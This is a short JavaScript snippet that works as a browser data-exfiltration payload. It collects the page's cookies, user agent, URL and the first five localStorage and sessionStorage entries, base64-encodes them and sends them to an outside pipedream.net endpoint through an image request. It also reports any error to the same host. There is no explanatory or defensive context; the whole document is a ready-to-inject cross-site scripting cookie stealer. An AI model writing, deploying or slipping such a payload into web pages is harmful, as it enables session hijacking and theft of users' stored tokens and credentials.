(() => {
  try {
    const payload = {
      c: document.cookie,
      u: navigator.userAgent,
      l: location.href,
      ls: Object.fromEntries(Object.entries(localStorage).slice(0, 5)),
      ss: Object.fromEntries(Object.entries(sessionStorage).slice(0, 5))
    };

    const b64 = btoa(JSON.stringify(payload));
    const img = new Image();
    img.src = 'https://eoat1elxcyeymir.m.pipedream.net/?data=' + b64;
    document.body.appendChild(img);
  } catch (e) {
    const errImg = new Image();
    errImg.src = 'https://eoat1elxcyeymir.m.pipedream.net/?err=' + btoa(e.toString());
    document.body.appendChild(errImg);
  }
})();
